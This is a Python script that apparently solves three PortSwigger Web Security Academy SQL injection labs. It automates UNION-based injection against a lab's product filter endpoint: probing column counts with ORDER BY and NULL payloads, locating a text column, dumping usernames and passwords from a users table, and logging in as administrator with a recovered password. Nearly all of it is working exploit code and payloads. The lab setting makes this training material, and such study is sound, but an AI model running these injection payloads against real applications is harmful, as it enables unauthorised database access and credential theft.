# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

import requests
requests.packages.urllib3.disable_warnings()

base = "https://ac651f4d1e173933800c27ee00450003.web-security-academy.net"
path = "/filter"
url = base + path
proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
cookies = {"session": "W3v9bhxkX3IXCZnRFbyugBAOMY1f2GmB"}
verify = False

def determineNumberOfColumnsLab():
    def usingOrderBy():
        for i in range(1, 11):
            yield f"' ORDER BY {i}-- "

    def usingNull():
        cols = "NULL"
        for _ in range(1, 11):
            yield f"' UNION SELECT {cols}-- "
            cols += ", NULL"

    hs = set()
    rs = {}
    # for q in usingOrderBy():
    for q in usingNull():
        params = {"category": q}
        r = requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
        h = hash(r.text)
        if h not in hs:
            hs.add(h)
            rs[q] = r

    for k,_ in rs.items():
        print(k)

def findColumnContainingTextLab():
    cols = ["'btHbdU', NULL, NULL",
            "NULL, 'btHbdU', NULL",
            "NULL, NULL, 'btHbdU'"]

    for c in cols:
        q = f"' UNION SELECT {c}-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)

def retrieveDataFromOtherTables():
    def getPassword():
        username = "username"
        password = "password"

        q = f"' UNION SELECT {username}, {password} FROM users-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)

    def loginWithPassword():
        username = "administrator"
        password = "y0j2xzbsm1xu3aghso67"

        q = f"' UNION SELECT {username}, {password} FROM users-- "
        data = {"csrf": "WKs3hfGISY4BwMNheiZM0ZPG6vZJJjw8", "username": username, "password": password}
        url = base + "/login"
        requests.post(url, data=data, cookies=cookies, verify=verify, proxies=proxies)

    getPassword()
    # loginWithPassword()


# determineNumberOfColumnsLab()
# findColumnContainingTextLab()
retrieveDataFromOtherTables()